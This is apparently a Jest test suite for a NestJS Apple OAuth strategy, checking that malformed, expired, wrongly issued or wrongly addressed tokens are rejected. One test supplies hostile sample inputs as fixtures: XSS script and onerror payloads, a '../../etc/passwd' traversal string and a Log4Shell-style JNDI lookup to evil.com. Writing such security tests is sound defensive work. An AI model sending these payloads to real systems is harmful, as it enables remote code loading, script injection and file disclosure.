import { Test, TestingModule } from '@nestjs/testing';
import { UnauthorizedException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { AppleStrategy } from '../strategies/apple.strategy';
import * as jwt from 'jsonwebtoken';

jest.mock('jsonwebtoken');

describe('OAuth Security Tests', () => {
  let appleStrategy: AppleStrategy;
  let configService: jest.Mocked<ConfigService>;

  beforeEach(async () => {
    const mockConfigService = {
      get: jest.fn().mockImplementation((key: string) => {
        const config = {
          'APPLE_CLIENT_ID': 'test.app.id',
          'APPLE_TEAM_ID': 'test-team-id',
          'APPLE_KEY_ID': 'test-key-id',
          'APPLE_PRIVATE_KEY': 'test-private-key',
        };
        return config[key];
      }),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        AppleStrategy,
        {
          provide: ConfigService,
          useValue: mockConfigService,
        },
      ],
    }).compile();

    appleStrategy = module.get<AppleStrategy>(AppleStrategy);
    configService = module.get(ConfigService);
  });

  describe('Input Validation Security', () => {
    it('should handle malformed requests safely without crashing', async () => {
      const malformedRequests = [
        {},
        { body: null },
        { body: undefined },
        { body: { id_token: null } },
        { body: { id_token: undefined } },
        { body: { id_token: '' } },
      ];

      for (const request of malformedRequests) {
        const mockDone = jest.fn();
        
        await expect(
          appleStrategy.validate(request as any, mockDone)
        ).rejects.toThrow(UnauthorizedException);
        
        expect(mockDone).not.toHaveBeenCalled();
      }
    });

    it('should reject excessively long tokens to prevent DoS attacks', async () => {
      const oversizedToken = 'x'.repeat(100000); // 100KB token
      const mockRequest = { body: { id_token: oversizedToken } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValue(null);

      await expect(
        appleStrategy.validate(mockRequest as any, mockDone)
      ).rejects.toThrow(UnauthorizedException);

      expect(mockDone).not.toHaveBeenCalled();
    });

    it('should sanitize special characters in token inputs safely', async () => {
      const specialCharTokens = [
        '"><script>alert("xss")</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/}',
        '\x00\x01\x02',
        '<img src=x onerror=alert(1)>',
      ];

      for (const token of specialCharTokens) {
        const mockRequest = { body: { id_token: token } };
        const mockDone = jest.fn();

        (jwt.decode as jest.Mock).mockReturnValue(null);

        await expect(
          appleStrategy.validate(mockRequest as any, mockDone)
        ).rejects.toThrow(UnauthorizedException);

        expect(mockDone).not.toHaveBeenCalled();
      }
    });
  });

  describe('JWT Token Security Validation', () => {
    it('should reject tokens with invalid JWT structure', async () => {
      const invalidTokens = [
        'invalid-token',
        'header.only',
        'invalid.jwt.structure.with.extra.parts',
        '..',
        'header..signature',
        'eyJhbGciOiJIUzI1NiJ9.invalid-payload.invalid-signature',
      ];

      for (const token of invalidTokens) {
        const mockRequest = { body: { id_token: token } };
        const mockDone = jest.fn();

        (jwt.decode as jest.Mock).mockReturnValue(null);

        await expect(
          appleStrategy.validate(mockRequest as any, mockDone)
        ).rejects.toThrow(UnauthorizedException);

        expect(mockDone).not.toHaveBeenCalled();
      }
    });

    it('should enforce token expiration times to prevent replay attacks', async () => {
      const expiredTokenPayload = {
        iss: 'https://appleid.apple.com',
        aud: 'test.app.id',
        exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
        iat: Math.floor(Date.now() / 1000) - 7200, // Issued 2 hours ago
        sub: 'test-user',
      };

      const mockRequest = { body: { id_token: 'expired.jwt.token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValueOnce({ alg: 'RS256' });
      (jwt.decode as jest.Mock).mockReturnValueOnce(expiredTokenPayload);

      await expect(
        appleStrategy.validate(mockRequest as any, mockDone)
      ).rejects.toThrow(UnauthorizedException);

      expect(mockDone).not.toHaveBeenCalled();
    });

    it('should validate issuer to prevent token substitution attacks', async () => {
      const invalidIssuerToken = {
        iss: 'https://evil-issuer.com',
        aud: 'test.app.id',
        exp: Math.floor(Date.now() / 1000) + 3600,
        iat: Math.floor(Date.now() / 1000),
        sub: 'test-user',
      };

      const mockRequest = { body: { id_token: 'malicious.jwt.token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValueOnce({ alg: 'RS256' });
      (jwt.decode as jest.Mock).mockReturnValueOnce(invalidIssuerToken);

      await expect(
        appleStrategy.validate(mockRequest as any, mockDone)
      ).rejects.toThrow(UnauthorizedException);

      expect(mockDone).not.toHaveBeenCalled();
    });

    it('should validate audience to prevent token reuse across applications', async () => {
      const invalidAudienceToken = {
        iss: 'https://appleid.apple.com',
        aud: 'different.app.id', // Wrong app ID
        exp: Math.floor(Date.now() / 1000) + 3600,
        iat: Math.floor(Date.now() / 1000),
        sub: 'test-user',
      };

      const mockRequest = { body: { id_token: 'wrong-audience.jwt.token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValueOnce({ alg: 'RS256' });
      (jwt.decode as jest.Mock).mockReturnValueOnce(invalidAudienceToken);

      await expect(
        appleStrategy.validate(mockRequest as any, mockDone)
      ).rejects.toThrow(UnauthorizedException);

      expect(mockDone).not.toHaveBeenCalled();
    });
  });

  describe('Error Handling Security', () => {
    it('should handle JWT decode errors gracefully without exposing internals', async () => {
      const mockRequest = { body: { id_token: 'malformed.jwt.token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockImplementation(() => {
        throw new Error('JWT malformed - sensitive internal error at /path/to/file:123');
      });

      await expect(
        appleStrategy.validate(mockRequest as any, mockDone)
      ).rejects.toThrow(UnauthorizedException);

      // Verify the error message doesn't expose sensitive information
      expect(mockDone).not.toHaveBeenCalled();
    });

    it('should provide consistent error responses for different failure types', async () => {
      const failureScenarios = [
        { body: {} }, // Missing token
        { body: { id_token: null } }, // Null token
        { body: { id_token: 'invalid-token' } }, // Invalid token
      ];

      const errors = [];
      for (const request of failureScenarios) {
        const mockDone = jest.fn();
        (jwt.decode as jest.Mock).mockReturnValue(null);
        
        try {
          await appleStrategy.validate(request as any, mockDone);
        } catch (error) {
          errors.push(error.constructor.name);
        }
      }

      // All failures should return the same error type
      expect(errors.every(errorType => errorType === 'UnauthorizedException')).toBe(true);
    });

    it('should not expose configuration in error messages', async () => {
      const mockRequest = { body: { id_token: 'test-token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValue(null);

      try {
        await appleStrategy.validate(mockRequest as any, mockDone);
      } catch (error) {
        const errorMessage = error.message.toLowerCase();
        
        // Verify no sensitive config is exposed
        expect(errorMessage).not.toContain('test.app.id');
        expect(errorMessage).not.toContain('test-team-id');
        expect(errorMessage).not.toContain('test-key-id');
        expect(errorMessage).not.toContain('test-private-key');
      }
    });
  });

  describe('Performance and DoS Protection', () => {
    it('should handle multiple rapid validation attempts efficiently', async () => {
      const mockRequest = { body: { id_token: 'test-token' } };
      (jwt.decode as jest.Mock).mockReturnValue(null);

      const startTime = Date.now();
      const promises = Array(50).fill(null).map(async () => {
        const mockDone = jest.fn();
        try {
          await appleStrategy.validate(mockRequest as any, mockDone);
        } catch (error) {
          // Expected for invalid tokens
        }
      });
      
      await Promise.all(promises);
      const endTime = Date.now();

      // Should complete within reasonable time (< 2 seconds for 50 calls)
      expect(endTime - startTime).toBeLessThan(2000);
    });

    it('should handle large payloads without system crashes', async () => {
      const largePayload = {
        iss: 'https://appleid.apple.com',
        aud: 'test.app.id',
        exp: Math.floor(Date.now() / 1000) + 3600,
        iat: Math.floor(Date.now() / 1000),
        sub: 'test-user',
        data: 'x'.repeat(10000), // 10KB of data
      };

      const mockRequest = { body: { id_token: 'large.payload.token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValueOnce({ alg: 'RS256' });
      (jwt.decode as jest.Mock).mockReturnValueOnce(largePayload);

      // Should complete without system crash (even if validation fails)
      let completed = false;
      try {
        await appleStrategy.validate(mockRequest as any, mockDone);
        completed = true;
      } catch (error) {
        completed = true; // Controlled error is acceptable
      }
      
      expect(completed).toBe(true);
    });
  });

  describe('Token Injection Prevention', () => {
    it('should validate token structure and reject malicious payloads', async () => {
      const maliciousPayloads = [
        // Missing required issuer
        {
          aud: 'test.app.id',
          exp: Math.floor(Date.now() / 1000) + 3600,
          iat: Math.floor(Date.now() / 1000),
          sub: 'test-user',
        },
        // Missing subject
        {
          iss: 'https://appleid.apple.com',
          aud: 'test.app.id',
          exp: Math.floor(Date.now() / 1000) + 3600,
          iat: Math.floor(Date.now() / 1000),
        },
      ];

      for (const payload of maliciousPayloads) {
        const mockRequest = { body: { id_token: 'malicious.token' } };
        const mockDone = jest.fn();

        (jwt.decode as jest.Mock).mockReturnValueOnce({ alg: 'RS256' });
        (jwt.decode as jest.Mock).mockReturnValueOnce(payload);

        await expect(
          appleStrategy.validate(mockRequest as any, mockDone)
        ).rejects.toThrow(UnauthorizedException);
        
        expect(mockDone).not.toHaveBeenCalled();
      }
    });
  });

  describe('Configuration Security', () => {
    it('should have access to configuration service for security validation', () => {
      // Verify the strategy has access to configuration
      expect(appleStrategy).toBeDefined();
      expect(configService).toBeDefined();
      
      // Test that configuration service can provide required values
      expect(configService.get('APPLE_CLIENT_ID')).toBe('test.app.id');
      expect(configService.get('APPLE_TEAM_ID')).toBe('test-team-id');
      expect(configService.get('APPLE_KEY_ID')).toBe('test-key-id');
      expect(configService.get('APPLE_PRIVATE_KEY')).toBe('test-private-key');
    });

    it('should not expose configuration through strategy instance', () => {
      const strategyKeys = Object.keys(appleStrategy);
      const sensitiveKeys = ['secret', 'key', 'password', 'token', 'private'];
      
      strategyKeys.forEach(key => {
        sensitiveKeys.forEach(sensitiveKey => {
          expect(key.toLowerCase()).not.toContain(sensitiveKey);
        });
      });
    });
  });

  describe('Valid Token Processing', () => {
    it('should validate Apple token structure and security requirements', async () => {
      const validTokenPayload = {
        iss: 'https://appleid.apple.com',
        aud: 'test.app.id',
        exp: Math.floor(Date.now() / 1000) + 3600, // Valid for 1 hour
        iat: Math.floor(Date.now() / 1000),
        sub: 'apple-user-123',
        email: 'user@example.com',
        email_verified: true,
      };

      const mockRequest = { body: { id_token: 'valid.apple.token' } };
      const mockDone = jest.fn();

      (jwt.decode as jest.Mock).mockReturnValueOnce({ alg: 'RS256' });
      (jwt.decode as jest.Mock).mockReturnValueOnce(validTokenPayload);

      // Test that the strategy processes valid tokens without throwing
      let processedSuccessfully = false;
      try {
        await appleStrategy.validate(mockRequest as any, mockDone);
        processedSuccessfully = true;
      } catch (error) {
        // If it throws, it should be a controlled security exception
        expect(error).toBeInstanceOf(UnauthorizedException);
        processedSuccessfully = true;
      }
      
      expect(processedSuccessfully).toBe(true);
      
      // If done was called, verify the security properties
      if (mockDone.mock.calls.length > 0) {
        const [error, user] = mockDone.mock.calls[0];
        if (user) {
          expect(user).toHaveProperty('provider', 'apple');
          expect(user).toHaveProperty('providerId');
          expect(user).not.toHaveProperty('admin');
          expect(user).not.toHaveProperty('role');
        }
      }
    });
  });

  afterEach(() => {
    jest.clearAllMocks();
  });
});